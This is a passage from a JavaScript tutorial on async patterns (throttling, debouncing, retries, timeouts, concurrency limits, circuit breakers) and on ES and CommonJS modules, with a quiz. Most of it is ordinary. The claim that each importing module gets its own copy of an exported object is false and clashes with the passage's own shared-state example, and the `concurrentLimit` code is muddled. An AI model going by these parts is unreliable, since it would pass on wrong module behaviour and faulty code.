    if (now - lastCall >= delay) {
      lastCall = now;
      return fn(...args);
    }
  };
}

// Usage: Window resize
window.addEventListener(
  'resize',
  throttle(() => {
    console.log('Window resized');
  }, 1000)  // Max once per second
);
```

### Advanced Throttle with Trailing Call

```javascript
// âœ… Throttle with leading and trailing calls
function throttle(fn, delay, { leading = true, trailing = false } = {}) {
  let lastCall = 0;
  let timeoutId = null;
  
  return function(...args) {
    const now = Date.now();
    
    if (!lastCall && !leading) {
      lastCall = now;
    }
    
    if (now - lastCall >= delay) {
      lastCall = now;
      fn(...args);
      
      if (timeoutId) {
        clearTimeout(timeoutId);
        timeoutId = null;
      }
    } else if (trailing && !timeoutId) {
      timeoutId = setTimeout(() => {
        lastCall = leading ? Date.now() : 0;
        timeoutId = null;
        fn(...args);
      }, delay - (now - lastCall));
    }
  };
}

// Usage
const onMouseMove = throttle(
  (event) => console.log('Mouse moved'),
  300,
  { leading: true, trailing: true }
);

document.addEventListener('mousemove', onMouseMove);
```

### Use Cases

```javascript
// âœ… Scroll event throttling
const handleScroll = throttle(() => {
  console.log('Scroll position:', window.scrollY);
}, 500);

window.addEventListener('scroll', handleScroll);

// âœ… API call throttling
const apiCall = throttle(() => {
  fetch('/api/search?q=' + query);
}, 1000);

// User types, but API called at most once per second
input.addEventListener('input', apiCall);
```

---

## Debouncing

### What is Debouncing?

**Debouncing** ensures a function is only called after it stops being invoked for a specified time interval.

```javascript
// âœ… Basic debounce implementation
function debounce(fn, delay) {
  let timeoutId = null;
  
  return function(...args) {
    if (timeoutId) {
      clearTimeout(timeoutId);
    }
    
    timeoutId = setTimeout(() => {
      fn(...args);
      timeoutId = null;
    }, delay);
  };
}

// Usage: Search input
const handleSearch = debounce((query) => {
  console.log('Searching for:', query);
  fetch(`/api/search?q=${query}`);
}, 300);

input.addEventListener('input', (e) => {
  handleSearch(e.target.value);
});
```

### Advanced Debounce with Immediate Option

```javascript
// âœ… Debounce with immediate execution
function debounce(fn, delay, { immediate = false } = {}) {
  let timeoutId = null;
  
  return function(...args) {
    const shouldCallNow = immediate && !timeoutId;
    
    if (timeoutId) {
      clearTimeout(timeoutId);
    }
    
    if (shouldCallNow) {
      fn(...args);
    }
    
    timeoutId = setTimeout(() => {
      if (!immediate) {
        fn(...args);
      }
      timeoutId = null;
    }, delay);
  };
}

// Usage: Button click (immediate)
const onClick = debounce(
  () => console.log('Clicked'),
  300,
  { immediate: true }
);

button.addEventListener('click', onClick);
```

### Debounce vs Throttle

```javascript
// âœ… Debounce: Wait until activity stops
const debouncedSearch = debounce((query) => {
  fetch(`/api/search?q=${query}`);
}, 500);

// Fire once 500ms after user stops typing
input.addEventListener('input', (e) => {
  debouncedSearch(e.target.value);
});

// âœ… Throttle: Fire regularly
const throttledScroll = throttle(() => {
  updateScrollPosition();
}, 100);

// Fire at most every 100ms while scrolling
window.addEventListener('scroll', throttledScroll);
```

---

## Retry Logic

### Simple Retry

```javascript
// âœ… Retry N times
async function retryAsync(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;  // All retries failed
      }
      console.log(`Attempt ${i + 1} failed, retrying...`);
    }
  }
}

// Usage
const data = await retryAsync(
  () => fetch('/api/data').then(r => r.json()),
  3
);
```

### Retry with Exponential Backoff

```javascript
// âœ… Exponential backoff: increases delay between retries
async function retryWithBackoff(
  fn,
  maxRetries = 3,
  baseDelay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = baseDelay * Math.pow(2, i);  // 1s, 2s, 4s...
      console.log(`Retrying in ${delay}ms...`);
      
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Usage: API call with backoff
const response = await retryWithBackoff(
  () => fetch('/api/data'),
  4,
  500
);
```

### Conditional Retry

```javascript
// âœ… Only retry on specific errors
async function retryOnError(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      // Don't retry on client errors (4xx)
      if (error.status >= 400 && error.status < 500) {
        throw error;
      }
      
      if (i === maxRetries - 1) {
        throw error;
      }
      
      // Retry on server errors (5xx) or network errors
      console.log('Retrying...');
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}
```

---

## Timeout Patterns

### Promise with Timeout

```javascript
// âœ… Race promise against timeout
async function withTimeout(promise, timeoutMs) {
  const timeout = new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error(`Operation timed out after ${timeoutMs}ms`));
    }, timeoutMs);
  });
  
  return Promise.race([promise, timeout]);
}

// Usage
try {
  const data = await withTimeout(
    fetch('/api/slow-endpoint').then(r => r.json()),
    5000
  );
} catch (error) {
  console.error(error.message);  // Operation timed out...
}
```

### AbortController for Native Timeouts

```javascript
// âœ… Modern approach using AbortController
async function fetchWithTimeout(url, timeoutMs) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      throw new Error(`Timeout after ${timeoutMs}ms`);
    }
    throw error;
  }
}

// Usage
try {
  const response = await fetchWithTimeout('/api/data', 5000);
  const data = await response.json();
} catch (error) {
  console.error(error.message);
}
```

---

## Concurrency Control

### Limit Concurrent Promises

```javascript
// âœ… Execute N promises concurrently
async function concurrentLimit(promises, limit) {
  const results = [];
  const executing = [];
  
  for (const [index, promise] of promises.entries()) {
    const p = Promise.resolve(promise)
      .then(result => {
        results[index] = result;
      });
    
    results[index] = p;
    
    if (promises.length >= limit) {
      executing.push(p);
      
      p.then(() => {
        executing.splice(executing.indexOf(p), 1);
      });
      
      if (executing.length >= limit) {
        await Promise.race(executing);
      }
    }
  }
  
  await Promise.all(results);
  return results;
}

// Usage: Download max 3 files concurrently
const files = ['file1', 'file2', 'file3', 'file4', 'file5'];
await concurrentLimit(
  files.map(file => downloadFile(file)),
  3  // Max 3 concurrent downloads
);
```

### Worker Pool Pattern

```javascript
// âœ… Manage pool of workers
class WorkerPool {
  constructor(size) {
    this.size = size;
    this.queue = [];
    this.active = 0;
  }
  
  async run(fn) {
    while (this.active >= this.size) {
      await new Promise(resolve => this.queue.push(resolve));
    }
    
    this.active++;
    
    try {
      return await fn();
    } finally {
      this.active--;
      const resolve = this.queue.shift();
      if (resolve) resolve();
    }
  }
}

// Usage
const pool = new WorkerPool(3);  // Max 3 concurrent

const tasks = [...].map(task => 
  pool.run(() => processTask(task))
);

await Promise.all(tasks);
```

---

## Queue Management

### Simple Task Queue

```javascript
// âœ… Process tasks one at a time
class Queue {
  constructor() {
    this.tasks = [];
    this.processing = false;
  }
  
  add(task) {
    this.tasks.push(task);
    this.process();
  }
  
  async process() {
    if (this.processing || this.tasks.length === 0) {
      return;
    }
    
    this.processing = true;
    
    while (this.tasks.length > 0) {
      const task = this.tasks.shift();
      try {
        await task();
      } catch (error) {
        console.error('Task failed:', error);
      }
    }
    
    this.processing = false;
  }
}

// Usage
const queue = new Queue();

queue.add(() => console.log('Task 1'));
queue.add(() => console.log('Task 2'));
queue.add(() => console.log('Task 3'));

// Output: Task 1, Task 2, Task 3 (sequentially)
```

### Priority Queue

```javascript
// âœ… Process tasks by priority
class PriorityQueue {
  constructor() {
    this.tasks = [];
    this.processing = false;
  }
  
  add(task, priority = 0) {
    this.tasks.push({ task, priority });
    this.tasks.sort((a, b) => b.priority - a.priority);
    this.process();
  }
  
  async process() {
    if (this.processing || this.tasks.length === 0) {
      return;
    }
    
    this.processing = true;
    
    while (this.tasks.length > 0) {
      const { task } = this.tasks.shift();
      try {
        await task();
      } catch (error) {
        console.error('Task failed:', error);
      }
    }
    
    this.processing = false;
  }
}

// Usage
const queue = new PriorityQueue();

queue.add(() => console.log('Low priority'), 1);
queue.add(() => console.log('High priority'), 10);
queue.add(() => console.log('Medium priority'), 5);

// Executes: High priority, Medium priority, Low priority
```

---

## Race Conditions and Solutions

### Identifying Race Conditions

```javascript
// âŒ Race condition: Multiple parallel requests
let cachedData = null;

async function fetchData() {
  if (cachedData) return cachedData;
  
  // If called twice before first completes,
  // both will fetch (both see null cache)
  const data = await fetch('/api/data').then(r => r.json());
  cachedData = data;
  return data;
}

// Race: fetchData() called twice
Promise.all([fetchData(), fetchData()]);
// Makes 2 requests instead of 1
```

### Solution 1: Deduplication

```javascript
// âœ… Cache the promise itself
let cachedPromise = null;

async function fetchData() {
  if (!cachedPromise) {
    cachedPromise = fetch('/api/data').then(r => r.json());
  }
  
  return cachedPromise;
}

// No matter how many times called, only 1 request
Promise.all([fetchData(), fetchData(), fetchData()]);
// Only 1 request made
```

### Solution 2: Request Deduplication Map

```javascript
// âœ… Deduplicate by key
const pendingRequests = new Map();

async function fetchDataByKey(key) {
  // Return existing promise if already requested
  if (pendingRequests.has(key)) {
    return pendingRequests.get(key);
  }
  
  // Create and cache the promise
  const promise = fetch(`/api/data/${key}`)
    .then(r => r.json())
    .finally(() => {
      pendingRequests.delete(key);  // Clean up
    });
  
  pendingRequests.set(key, promise);
  return promise;
}

// Multiple calls with same key use same request
fetchDataByKey('user-1');
fetchDataByKey('user-1');  // Reuses first request
fetchDataByKey('user-2');  // New request
```

### Solution 3: Abort Stale Requests

```javascript
// âœ… Cancel stale requests
class AbortableRequest {
  constructor() {
    this.controller = null;
    this.result = null;
  }
  
  async fetch(url) {
    // Abort previous request
    if (this.controller) {
      this.controller.abort();
    }
    
    this.controller = new AbortController();
    
    try {
      const response = await fetch(url, {
        signal: this.controller.signal
      });
      this.result = await response.json();
      return this.result;
    } catch (error) {
      if (error.name === 'AbortError') {
        console.log('Previous request cancelled');
      }
      throw error;
    }
  }
}

// Usage: Search that cancels previous searches
const search = new AbortableRequest();

search.fetch('/api/search?q=a');  // Request 1
search.fetch('/api/search?q=ab'); // Cancels request 1
search.fetch('/api/search?q=abc');// Cancels request 2
// Only last request completes
```

---

## Advanced Patterns

### Pattern: Timeout with Fallback

```javascript
// âœ… Try primary with timeout, fall back to secondary
async function withFallback(primary, fallback, timeoutMs) {
  try {
    return await withTimeout(primary, timeoutMs);
  } catch (error) {
    console.warn('Primary failed, trying fallback:', error.message);
    return await fallback();
  }
}

// Usage
const data = await withFallback(
  fetch('/api/primary'),
  () => fetch('/api/cache'),
  3000
);
```

### Pattern: Circuit Breaker

```javascript
// âœ… Stop making requests after repeated failures
class CircuitBreaker {
  constructor(fn, { failureThreshold = 5, resetTimeout = 60000 } = {}) {
    this.fn = fn;
    this.failureThreshold = failureThreshold;
    this.resetTimeout = resetTimeout;
    this.failures = 0;
    this.state = 'CLOSED';  // CLOSED, OPEN, HALF_OPEN
    this.nextAttempt = Date.now();
  }
  
  async call(...args) {
    if (this.state === 'OPEN') {
      if (Date.now() < this.nextAttempt) {
        throw new Error('Circuit breaker is OPEN');
      }
      this.state = 'HALF_OPEN';
    }
    
    try {
      const result = await this.fn(...args);
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  onSuccess() {
    this.failures = 0;
    this.state = 'CLOSED';
  }
  
  onFailure() {
    this.failures++;
    if (this.failures >= this.failureThreshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.resetTimeout;
    }
  }
}

// Usage
const breaker = new CircuitBreaker(() => fetch('/api/unreliable'));

try {
  const data = await breaker.call();
} catch (error) {
  console.error(error.message);
}
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use Promise.all for parallel operations
const results = await Promise.all([
  fetchUser(),
  fetchPosts(),
  fetchComments()
]);

// âœ… Debounce frequent events
const handleSearch = debounce((query) => {
  search(query);
}, 300);

// âœ… Implement timeout for external calls
const data = await withTimeout(fetch(url), 5000);

// âœ… Deduplicate concurrent requests
const request = pendingRequests.get(key) || fetch(url);

// âœ… Use exponential backoff for retries
await retryWithBackoff(operation, 3, 1000);
```

### âŒ DON'T

```javascript
// âŒ Don't make multiple identical concurrent requests
fetch('/api/data');
fetch('/api/data');  // Duplicate request

// âŒ Don't forget to debounce high-frequency events
input.addEventListener('input', expensiveOperation);

// âŒ Don't await in loops when you can parallelize
for (const item of items) {
  await process(item);  // Too slow!
}

// âŒ Don't ignore timeout scenarios
const data = await fetch(url).then(r => r.json());  // No timeout

// âŒ Don't retry without backoff
for (let i = 0; i < 5; i++) {
  try {
    return await operation();
  } catch (e) {
    // Immediate retry (hammers server)
  }
}
```

---

## Summary

### Async Patterns Overview

| Pattern | Purpose | Key Benefit |
|---------|---------|------------|
| **Promisification** | Convert callbacks to promises | Use async/await |
| **Throttling** | Limit call frequency | Reduce overhead |
| **Debouncing** | Wait until activity stops | Save bandwidth |
| **Retry** | Repeat failed operations | Handle transients |
| **Timeout** | Limit operation duration | Prevent hangs |
| **Concurrency Control** | Limit parallel operations | Manage resources |
| **Queue** | Process sequentially | Order matters |
| **Deduplication** | Avoid duplicate requests | Save bandwidth |
| **Circuit Breaker** | Stop calling failing service | Fail fast |

### Quick Reference

```javascript
// Debounce frequent events
const debounced = debounce(fn, 300);

// Throttle repeated events
const throttled = throttle(fn, 300);

// Retry with backoff
await retryWithBackoff(fn, 3, 1000);

// Timeout protection
await withTimeout(promise, 5000);

// Parallel execution
await Promise.all([p1, p2, p3]);

// Limited concurrency
await concurrentLimit(promises, 3);

// Sequential queue
const queue = new Queue();
queue.add(task);
```

### Next Steps

- Combine patterns for complex scenarios
- Build robust error handling
- Optimize performance with caching
- Monitor and debug async operations

## 13.6 Async Summary

| Concept | Description |
|---------|-------------|
| Event Loop | Processes call stack, microtasks, then macrotasks |
| Callbacks | Functions passed to async operations |
| Promises | Objects representing eventual completion/failure |
| async/await | Syntactic sugar for promise-based code |
| `Promise.all` | Parallel execution, fail-fast |
| `Promise.allSettled` | Parallel, all results (ES2020) |
| `Promise.race` | First to settle wins |

---

## Mastery Check

### Quiz Questions

**Q1:** Predict the output order:
```javascript
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
queueMicrotask(() => console.log('4'));
console.log('5');
```

<details>
<summary>Answer</summary>

```
1
5
3
4
2
```
Sync code (1, 5) â†’ Microtasks (3, 4) â†’ Macrotasks (2)
</details>

**Q2:** What's wrong with this code?
```javascript
async function getData() {
  const users = await fetch('/api/users').then(r => r.json());
  const posts = await fetch('/api/posts').then(r => r.json());
  const comments = await fetch('/api/comments').then(r => r.json());
  return { users, posts, comments };
}
```

<details>
<summary>Answer</summary>

Sequential awaits! The three requests run one after another instead of in parallel. Fix with `Promise.all`:

```javascript
async function getData() {
  const [users, posts, comments] = await Promise.all([
    fetch('/api/users').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
    fetch('/api/comments').then(r => r.json())
  ]);
  return { users, posts, comments };
}
```
</details>

**Q3:** What happens here?
```javascript
async function test() {
  return 'hello';
}

console.log(test());
console.log(await test());
```

<details>
<summary>Answer</summary>

```javascript
console.log(test());       // Promise { 'hello' } (async always returns Promise)
console.log(await test()); // 'hello' (await unwraps the promise)
```
</details>

**Q4:** Explain the difference:
```javascript
// Version A
for (const item of items) {
  await processItem(item);
}

// Version B
await Promise.all(items.map(item => processItem(item)));
```

<details>
<summary>Answer</summary>

- **Version A**: Sequential â€” processes one item at a time, in order
- **Version B**: Parallel â€” processes all items simultaneously

Use A when order matters or resource-constrained. Use B for maximum throughput (but watch out for rate limits).
</details>

### Coding Challenges

**Challenge 1:** Implement `delay(ms)` that returns a promise resolving after ms milliseconds.

<details>
<summary>Solution</summary>

```javascript
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Usage
await delay(1000);
console.log('1 second later');
```
</details>

**Challenge 2:** Create `promiseWithTimeout(promise, ms)` that rejects if the promise doesn't resolve within ms.

<details>
<summary>Solution</summary>

```javascript
function promiseWithTimeout(promise, ms) {
  const timeout = new Promise((_, reject) => {
    setTimeout(() => reject(new Error('Timeout')), ms);
  });
  
  return Promise.race([promise, timeout]);
}

// Usage
const data = await promiseWithTimeout(fetch('/api/slow'), 5000);
```
</details>

**Challenge 3:** Implement `asyncPool(concurrency, items, iteratorFn)` that limits concurrent promises.

<details>
<summary>Solution</summary>

```javascript
async function asyncPool(concurrency, items, iteratorFn) {
  const results = [];
  const executing = new Set();
  
  for (const item of items) {
    const promise = Promise.resolve().then(() => iteratorFn(item));
    results.push(promise);
    executing.add(promise);
    
    const cleanup = () => executing.delete(promise);
    promise.then(cleanup, cleanup);
    
    if (executing.size >= concurrency) {
      await Promise.race(executing);
    }
  }
  
  return Promise.all(results);
}

// Usage: Process 100 URLs, max 5 at a time
const results = await asyncPool(5, urls, url => fetch(url));
```
</details>

---

**End of Chapter 13: Asynchronous JavaScript**


# 14-Modules.md

# 14 Modules

Modules organize code into reusable units. ES modules (`import`/`export`) are the standard; CommonJS remains common in Node.js.

---

# ES Modules (ESM) 



## import Statement

### Basic Imports

```javascript
// âœ… Import named export
import { add } from './math.js';

// âœ… Import multiple named exports
import { add, subtract, multiply } from './math.js';

// âœ… Import with alias
import { add as addition } from './math.js';
console.log(addition(5, 3));

// âœ… Import all named exports as namespace
import * as math from './math.js';
console.log(math.add(5, 3));
console.log(math.subtract(5, 3));

// âœ… Import default export
import Calculator from './calculator.js';

// âœ… Import both default and named
import Calculator, { add, subtract } from './calculator.js';
```

### Import Paths

```javascript
// âœ… Relative paths (most common)
import { helper } from './utils/helper.js';
import { config } from '../config.js';

// âœ… Absolute paths (some environments)
import { helper } from '/src/utils/helper.js';

// âœ… Package imports (npm packages)
import React from 'react';
import { useState } from 'react';

// âœ… Bare module specifier
import lodash from 'lodash-es';

// âœ… With file extension (required in ESM)
import { fn } from './module.js';  // âœ“ Correct
// import { fn } from './module';  // âœ— Wrong
```

### Import Side Effects

```javascript
// âœ… Import for side effects only (no bindings)
import './polyfills.js';
import './global-styles.css';

// Module executes but nothing is imported
```

### Hoisting Behavior

```javascript
// âœ… Import declarations are hoisted
console.log(add(2, 3));  // Works! (5)

import { add } from './math.js';

// All imports are processed before code execution
```

---

## export Statement

### Named Exports

```javascript
// âœ… Export individual declarations
export function add(a, b) {
  return a + b;
}

export const PI = 3.14159;

export class Calculator {
  constructor(value) {
    this.value = value;
  }
}

// âœ… Export after declaration
function subtract(a, b) {
  return a - b;
}

const E = 2.71828;

export { subtract, E };

// âœ… Export with rename
export { subtract as minus };

// âœ… Export multiple with renames
export {
  subtract as minus,
  E as EULER_NUMBER
};
```

### Default Export

```javascript
// âœ… Export default function
export default function greet(name) {
  return `Hello, ${name}!`;
}

// âœ… Export default class
export default class Calculator {
  add(a, b) {
    return a + b;
  }
}

// âœ… Export default value
export default {
  name: 'MyApp',
  version: '1.0.0'
};

// âœ… Export default after declaration
const config = { debug: true };
export default config;

// Note: Only ONE default export per module
```

### Mixed Exports

```javascript
// âœ… Combine default and named exports
export default class User {
  constructor(name) {
    this.name = name;
  }
}

export function createUser(name) {
  return new User(name);
}

export const ADMIN_ROLE = 'admin';

// Import
import User, { createUser, ADMIN_ROLE } from './user.js';
```

---

## Default Exports vs Named Exports

### Comparison

| Aspect | Default Export | Named Export |
|--------|-----------------|--------------|
| **Quantity** | One per module | Multiple per module |
| **Import name** | Any name | Must match name |
| **Syntax** | `export default` | `export { name }` |
| **Use case** | Main export | Utilities/helpers |
| **Alias** | Always possible | Optional |

```javascript
// âœ… Default export - rename on import
export default class Logger {}
import Logger from './logger.js';  // Any name
import MyLogger from './logger.js'; // Also works

// âœ… Named export - must match or use alias
export class Logger {}
import { Logger } from './logger.js';     // Must match
import { Logger as MyLogger } from './logger.js';  // Alias required
```

### When to Use Each

```javascript
// âœ… Use default export for main functionality
// calculator.js
export default class Calculator {
  add(a, b) { return a + b; }
}

// app.js
import Calculator from './calculator.js';

// âœ… Use named exports for utilities/helpers
// utils.js
export function formatDate(date) { /* ... */ }
export function parseJSON(str) { /* ... */ }
export function debounce(fn, delay) { /* ... */ }

// app.js
import { formatDate, debounce } from './utils.js';
```

---

## Re-exporting

### Basic Re-export

```javascript
// âœ… Re-export named export
export { add } from './math.js';

// âœ… Re-export multiple
export { add, subtract } from './math.js';

// âœ… Re-export with alias
export { add as addition } from './math.js';

// âœ… Re-export all
export * from './math.js';
```

### Re-exporting Default

```javascript
// âœ… Re-export default
export { default } from './calculator.js';

// âœ… Re-export default with name
export { default as Calculator } from './calculator.js';

// âœ… Re-export default as named
export { default as myCalculator } from './calculator.js';
```

### Barrel Exports (Index Pattern)

```javascript
// components/index.js
export { default as Button } from './Button.js';
export { default as Input } from './Input.js';
export { default as Modal } from './Modal.js';

export { useForm } from './hooks/useForm.js';
export { useAuth } from './hooks/useAuth.js';

// app.js
import { Button, Input, Modal, useForm } from './components/index.js';
// Or just:
import { Button, Input, Modal, useForm } from './components';

// Index.js is automatically resolved
```

### Namespace Exports

```javascript
// math.js
export function add(a, b) { return a + b; }
export function subtract(a, b) { return a - b; }

// aggregator.js (re-export as namespace)
export * as math from './math.js';

// app.js
import { math } from './aggregator.js';
console.log(math.add(5, 3));
```

---

## Dynamic Imports

### Basic Dynamic Import

```javascript
// âœ… Import on demand
button.addEventListener('click', async () => {
  const { processData } = await import('./processor.js');
  processData(data);
});

// âœ… Conditional import
if (isDevelopment) {
  const { DevTools } = await import('./dev-tools.js');
}

// âœ… Dynamic module path
async function loadModule(moduleName) {
  const module = await import(`./modules/${moduleName}.js`);
  return module;
}

const utils = await loadModule('utils');
```

### Use Cases

```javascript
// âœ… Code splitting / Lazy loading
async function loadFeature(feature) {
  const module = await import(`./features/${feature}.js`);
  return module.init();
}

// âœ… Conditional dependencies
async function loadPolyfill() {
  if (!Array.prototype.includes) {
    await import('./polyfills/array-includes.js');
  }
}

// âœ… Large library lazy loading
button.addEventListener('click', async () => {
  const { Chart } = await import('chart.js');
  // Use Chart...
});

// âœ… Route-based code splitting
async function renderPage(route) {
  const module = await import(`./pages/${route}.js`);
  return module.render();
}
```

### Error Handling

```javascript
// âœ… Handle import errors
async function loadModule(name) {
  try {
    return await import(`./modules/${name}.js`);
  } catch (error) {
    console.error(`Failed to load ${name}:`, error);
    return null;
  }
}

// âœ… Fallback module
async function loadWithFallback(primary, fallback) {
  try {
    return await import(primary);
  } catch (error) {
    console.warn(`Failed to load ${primary}, using fallback`);
    return await import(fallback);
  }
}
```

---

## import.meta

### What is import.meta?

`import.meta` is an object containing metadata about the current module.

```javascript
// âœ… Common properties
console.log(import.meta.url);   // file:///.../module.js
console.log(import.meta.main);  // true if main module
console.log(import.meta.resolve); // Resolve module path
```

### Use Cases

```javascript
// âœ… Get module directory
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

console.log(__dirname);  // Current directory path

// âœ… Resolve relative paths
const configPath = import.meta.resolve('./config.json');

// âœ… Check if module is main
if (import.meta.main) {
  console.log('This is the main module');
  // Run CLI logic
}

// âœ… Environment detection
if (import.meta.url.includes('http')) {
  console.log('Running in browser');
} else {
  console.log('Running in Node.js');
}

// âœ… Dynamic import resolution
const moduleName = process.env.MODULE || 'default';
const modulePath = import.meta.resolve(`./${moduleName}.js`);
const module = await import(modulePath);
```

---

## Module Scope

### Module Scope Isolation

```javascript
// module1.js
const privateVar = 'private';  // Not accessible outside
let counter = 0;

export function increment() {
  counter++;
}

export function getCounter() {
  return counter;
}

// module2.js
import { getCounter, increment } from './module1.js';

console.log(getCounter());  // 0
increment();
console.log(getCounter());  // 1

// Each module has its own scope
// privateVar is inaccessible
// counter is private (encapsulated)
```

### Global Scope vs Module Scope

```javascript
// âŒ Creates global variable
globalThis.config = { debug: true };

// âœ… Module-scoped variable
const config = { debug: true };
export { config };

// âœ… Each module gets its own copy
// module1.js
import { config } from './config.js';
config.debug = false;

// module2.js
import { config } from './config.js';
console.log(config.debug);  // true (not affected by module1)
```

### Shared State

```javascript
// counter.js
let count = 0;

export function increment() {
  return ++count;
}

export function getCount() {
  return count;
}

// module1.js
import { increment, getCount } from './counter.js';

increment();
increment();
console.log(getCount());  // 2

// module2.js
import { increment, getCount } from './counter.js';

console.log(getCount());  // 2 (shared state!)
increment();
console.log(getCount());  // 3
```

---

## Top-Level await

### Using await Outside async Function

```javascript
// âœ… Top-level await (ES2022)
const response = await fetch('/api/data');
const data = await response.json();

console.log('Data loaded:', data);

// Module waits for promise before continuing
```

### Module Loading Order

```javascript
// module1.js
console.log('Module 1: start');
const data = await fetch('/data').then(r => r.json());
console.log('Module 1: got data');

export { data };

// module2.js
console.log('Module 2: start');
import { data } from './module1.js';
console.log('Module 2: data available', data);

// Output:
// Module 1: start
// Module 1: got data
// Module 2: start
// Module 2: data available ...
```

### Use Cases

```javascript
// âœ… Initialize module on load
const db = await connectDatabase();
const config = await loadConfig();

export { db, config };

// âœ… Conditional module loading
const API_URL = await getApiUrl();

const api = API_URL.includes('localhost')
  ? await import('./mockApi.js')
  : await import('./realApi.js');

export { api };

// âœ… Database migrations
await runMigrations();
console.log('Database ready');
```

---

## Practical Examples

### Example 1: Calculator Module with Namespace

```javascript
// calculator.js
export const add = (a, b) => a + b;
export const subtract = (a, b) => a - b;
export const multiply = (a, b) => a * b;
export const divide = (a, b) => {
  if (b === 0) throw new Error('Division by zero');
  return a / b;
};

// app.js
import * as calc from './calculator.js';

console.log(calc.add(10, 5));       // 15
console.log(calc.multiply(3, 4));   // 12
```

### Example 2: Component with Re-exports

```javascript
// components/Button.js
export default function Button({ onClick, children }) {
  return <button onClick={onClick}>{children}</button>;
}

// components/Input.js
export default function Input({ onChange, value }) {
  return <input onChange={onChange} value={value} />;
}

// components/index.js
export { default as Button } from './Button.js';
export { default as Input } from './Input.js';

// app.js
import { Button, Input } from './components/index.js';
```

### Example 3: Feature Flags with Dynamic Import

```javascript
// features/index.js
const features = {
  analytics: false,
  darkMode: true,
  betaFeatures: false
};

export async function loadFeature(name) {
  if (!features[name]) {
    throw new Error(`Feature ${name} is disabled`);
  }

  return import(`./features/${name}.js`);
}

// app.js
const analytics = await loadFeature('analytics');
// Or graceful fallback:
try {
  const darkMode = await loadFeature('darkMode');
  darkMode.init();
} catch (error) {
  console.warn(error.message);
}
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use named exports for utilities
export function formatDate(date) { }
export function parseJSON(str) { }

// âœ… Use default export for main class/component
export default class User { }

// âœ… Use barrel exports for organization
export { default as Button } from './Button.js';
export { default as Input } from './Input.js';

// âœ… Import specific items needed
import { add, subtract } from './math.js';

// âœ… Use dynamic import for code splitting
const module = await import('./heavy-module.js');

// âœ… Use top-level await for initialization
const config = await loadConfig();
export { config };
```

### âŒ DON'T

```javascript
// âŒ Don't mix default and named confusingly
export default function main() { }
export default class Helper { }  // ERROR: duplicate default

// âŒ Don't import everything unnecessarily
import * as math from './math.js';
const result = math.add(5, 3);  // Could just: import { add }

// âŒ Don't use dynamic import carelessly
const module = await import(userInput);  // Security risk!

// âŒ Don't forget file extensions
import { helper } from './utils';  // ERROR in ESM
import { helper } from './utils.js';  // Correct

// âŒ Don't create circular dependencies
// a.js: import { b } from './b.js';
// b.js: import { a } from './a.js';
```

---

## Summary

### Import/Export Quick Reference

```javascript
// Named exports
export function add(a, b) { }
export const PI = 3.14;
export { subtract, multiply };

// Default export
export default class Calculator { }

// Named imports
import { add, PI } from './math.js';

// Default import
import Calculator from './calculator.js';

// Mixed
import Calculator, { add, PI } from './all.js';

// Namespace import
import * as math from './math.js';

// Dynamic import
const module = await import('./module.js');

// Re-export
export { add } from './math.js';
export * from './utils.js';
```

### Module System Comparison

| Feature | ESM | CommonJS |
|---------|-----|----------|
| **Standard** | ES6+ | Node.js custom |
| **Syntax** | `import`/`export` | `require()`/`module.exports` |
| **Loading** | Async | Sync |
| **Top-level await** | âœ… Yes | âŒ No |
| **Dynamic import** | âœ… `import()` | âœ… `require()` |
| **Tree-shaking** | âœ… Yes | âŒ Difficult |

### Next Steps

- Learn CommonJS for Node.js compatibility
- Master module patterns
- Understand ESM vs CommonJS interop
- Build modular applications
## CommonJS (Node.js) 



## require() Function

### Basic require()

```javascript
// âœ… Require local module
const math = require('./math.js');
const math2 = require('./math');  // .js extension optional

// âœ… Require npm package
const express = require('express');
const _ = require('lodash');

// âœ… Require built-in Node.js module
const fs = require('fs');
const path = require('path');

// âœ… Require from node_modules (without ./  or ../)
const package = require('package-name');
```

### Destructuring Imports

```javascript
// âœ… Destructure specific exports
const { add, subtract } = require('./math.js');

console.log(add(5, 3));
console.log(subtract(5, 3));

// âœ… Destructure with renaming
const { add: addition, subtract: minus } = require('./math.js');

// âœ… Get everything then destructure
const math = require('./math.js');
const { add, subtract } = math;
```

### Module Paths

```javascript
// âœ… Relative paths
const utils = require('./utils.js');           // Same directory
const config = require('../config.js');        // Parent directory
const helper = require('./lib/helper.js');     // Subdirectory

// âœ… Package paths (installed npm)
const react = require('react');
const lodash = require('lodash');

// âœ… Absolute paths
const fs = require('fs');
const path = require('path');
const absolutePath = require('/absolute/path/module.js');

// âœ… Built-in modules
const http = require('http');
const util = require('util');
```

### Conditional Imports

```javascript
// âœ… Load module conditionally
let db;
if (process.env.NODE_ENV === 'production') {
  db = require('./db/postgres.js');
} else {
  db = require('./db/sqlite.js');
}

// âœ… Try-catch for optional dependencies
let optional;
try {
  optional = require('optional-package');
} catch (error) {
  optional = null;
}

if (optional) {
  optional.init();
}
```

---

## module.exports and exports

### module.exports

```javascript
// âœ… Export object with properties
module.exports = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  PI: 3.14159
};

// âœ… Export function
module.exports = function greet(name) {
  return `Hello, ${name}!`;
};

// âœ… Export class
